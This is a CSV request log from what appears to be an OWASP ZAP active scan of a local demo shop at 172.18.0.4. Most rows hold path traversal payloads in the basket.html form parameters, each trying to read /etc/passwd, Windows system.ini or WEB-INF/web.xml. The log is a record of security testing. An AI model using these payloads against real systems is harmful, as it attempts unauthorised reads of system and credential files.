Id,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
144,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,GET,http://172.18.0.4:30001/786790410230118229,404,Not Found,7,430,31
146,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,GET,http://172.18.0.4:30001/css/3382523107937556262,404,Not Found,5,307,36
148,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,GET,http://172.18.0.4:30001/img/5717897623431467528,404,Not Found,4,307,36
150,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,GET,http://172.18.0.4:30001/js/4910771533823093039,404,Not Found,13,308,35
152,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,19,308,34
153,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,47,307,34
154,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,4,307,34
155,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,8,307,34
156,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,6,307,34
157,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,50,307,34
158,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,8,307,34
159,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,9,307,34
160,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,44,307,34
161,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,6,307,34
162,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,5,307,34
163,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,56,307,34
164,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,15,307,34
165,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:04 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,6,307,34
166,Mon Mar 20 13:42:04 CET 2023,Mon Mar 20 13:42:05 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,51,307,34
167,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,16,307,34
168,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,6,307,34
169,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,POST,http://172.18.0.4:30001/customer-orders.html,404,Not Found,53,307,34
170,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=c%3A%2FWindows%2Fsystem.ini&ccv=ZAP&expires=ZAP,200,OK,3,400,23388
171,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&ccv=ZAP&expires=ZAP,200,OK,8,400,23388
172,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=c%3A%5CWindows%5Csystem.ini&ccv=ZAP&expires=ZAP,200,OK,2,400,23388
173,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&ccv=ZAP&expires=ZAP,200,OK,3,400,23388
174,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=c%3A%2FWindows%2Fsystem.ini&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,5,400,23388
175,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=%2Fetc%2Fpasswd&ccv=ZAP&expires=ZAP,200,OK,5,400,23388
176,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,13,400,23388
177,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&ccv=ZAP&expires=ZAP,200,OK,8,400,23388
178,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:05 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=c%3A%5CWindows%5Csystem.ini&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,4,400,23388
179,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,16,400,23388
180,Mon Mar 20 13:42:05 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=c%3A%2F&ccv=ZAP&expires=ZAP,200,OK,44,400,23388
181,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=%2F&ccv=ZAP&expires=ZAP,200,OK,4,400,23388
182,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=%2Fetc%2Fpasswd&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,10,400,23388
183,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=c%3A%5C&ccv=ZAP&expires=ZAP,200,OK,8,400,23388
184,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,4,400,23388
185,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&ccv=ZAP&expires=ZAP,200,OK,22,401,23388
186,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=c%3A%2F&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,9,400,23388
187,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=%2F&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,5,400,23388
188,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=WEB-INF%2Fweb.xml&ccv=ZAP&expires=ZAP,200,OK,4,400,23388
189,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=c%3A%5C&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,10,400,23388
190,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=WEB-INF%5Cweb.xml&ccv=ZAP&expires=ZAP,200,OK,15,401,23388
191,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,12,400,23388
192,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=%2FWEB-INF%2Fweb.xml&ccv=ZAP&expires=ZAP,200,OK,11,400,23388
193,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=%5CWEB-INF%5Cweb.xml&ccv=ZAP&expires=ZAP,200,OK,3,400,23388
194,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=WEB-INF%2Fweb.xml&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,5,400,23388
195,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=thishouldnotexistandhopefullyitwillnot&ccv=ZAP&expires=ZAP,200,OK,4,400,23388
196,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=WEB-INF%5Cweb.xml&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
197,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=%2FWEB-INF%2Fweb.xml&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
198,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=basket.html&ccv=ZAP&expires=ZAP,200,OK,2,400,23388
199,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=%2Fbasket.html&ccv=ZAP&expires=ZAP,200,OK,6,400,23388
200,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=%5CWEB-INF%5Cweb.xml&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,6,400,23388
201,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=thishouldnotexistandhopefullyitwillnot&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,5,400,23388
202,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=basket.html&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
203,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=%5Cbasket.html&ccv=ZAP&expires=ZAP,200,OK,48,400,23388
204,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=%2Fbasket.html&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,13,401,23388
205,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=%5Cbasket.html&country=ZAP&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
206,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=c%3A%2FWindows%2Fsystem.ini&expires=ZAP,200,OK,4,400,23388
207,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=c%3A%2FWindows%2Fsystem.ini&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
208,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&expires=ZAP,200,OK,56,400,23388
209,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,25,401,23388
210,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=c%3A%5CWindows%5Csystem.ini&expires=ZAP,200,OK,15,401,23388
211,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&expires=ZAP,200,OK,3,400,23388
212,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=c%3A%5CWindows%5Csystem.ini&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,14,400,23388
213,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=%2Fetc%2Fpasswd&expires=ZAP,200,OK,21,400,23388
214,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,22,400,23388
215,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&expires=ZAP,200,OK,22,400,23388
216,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=%2Fetc%2Fpasswd&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,20,400,23388
217,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=c%3A%2F&expires=ZAP,200,OK,14,400,23388
218,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,10,400,23388
219,Mon Mar 20 13:42:06 CET 2023,Mon Mar 20 13:42:06 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=%2F&expires=ZAP,200,OK,15,400,23388
220,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=c%3A%2F&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
221,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=%2F&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
222,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=c%3A%5C&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,6,400,23388
223,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,6,400,23388
224,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=WEB-INF%2Fweb.xml&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,4,400,23388
225,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=c%3A%5C&expires=ZAP,200,OK,50,400,23388
226,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&expires=ZAP,200,OK,9,400,23388
227,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=WEB-INF%5Cweb.xml&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,12,401,23388
228,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=WEB-INF%2Fweb.xml&expires=ZAP,200,OK,7,400,23388
229,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=%2FWEB-INF%2Fweb.xml&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,5,400,23388
230,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=WEB-INF%5Cweb.xml&expires=ZAP,200,OK,3,400,23388
231,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=%5CWEB-INF%5Cweb.xml&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,3,400,23388
232,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=%2FWEB-INF%2Fweb.xml&expires=ZAP,200,OK,3,400,23388
233,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=thishouldnotexistandhopefullyitwillnot&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,15,400,23388
234,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=%5CWEB-INF%5Cweb.xml&expires=ZAP,200,OK,4,400,23388
235,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=basket.html&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,8,400,23388
236,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=thishouldnotexistandhopefullyitwillnot&expires=ZAP,200,OK,3,400,23388
237,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=basket.html&expires=ZAP,200,OK,2,400,23388
238,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=%2Fbasket.html&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,15,400,23388
239,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=%2Fbasket.html&expires=ZAP,200,OK,48,400,23388
240,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=%5Cbasket.html&expires=ZAP,200,OK,7,400,23388
241,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=%5Cbasket.html&house-number=ZAP&post-code=ZAP&street=ZAP,200,OK,45,400,23388
242,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=c%3A%2FWindows%2Fsystem.ini,200,OK,3,400,23388
243,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=c%3A%2FWindows%2Fsystem.ini&post-code=ZAP&street=ZAP,200,OK,22,400,23388
244,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,200,OK,15,400,23388
245,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&post-code=ZAP&street=ZAP,200,OK,4,400,23388
246,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=c%3A%5CWindows%5Csystem.ini,200,OK,3,400,23388
247,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=c%3A%5CWindows%5Csystem.ini&post-code=ZAP&street=ZAP,200,OK,4,400,23388
248,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,200,OK,4,400,23388
249,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=%2Fetc%2Fpasswd,200,OK,9,400,23388
250,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&post-code=ZAP&street=ZAP,200,OK,44,400,23388
251,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=%2Fetc%2Fpasswd&post-code=ZAP&street=ZAP,200,OK,2,400,23388
252,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&post-code=ZAP&street=ZAP,200,OK,2,400,23388
253,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,200,OK,45,400,23388
254,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=c%3A%2F,200,OK,11,400,23388
255,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=c%3A%2F&post-code=ZAP&street=ZAP,200,OK,2,400,23388
256,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=%2F,200,OK,2,400,23388
257,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=%2F&post-code=ZAP&street=ZAP,200,OK,5,400,23388
258,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=c%3A%5C,200,OK,3,400,23388
259,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?city=ZAP&country=ZAP&house-number=c%3A%5C&post-code=ZAP&street=ZAP,200,OK,6,400,23388
260,Mon Mar 20 13:42:07 CET 2023,Mon Mar 20 13:42:07 CET 2023,GET,http://172.18.0.4:30001/basket.html?card-number=ZAP&ccv=ZAP&expires=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,200,OK,12,400,23388
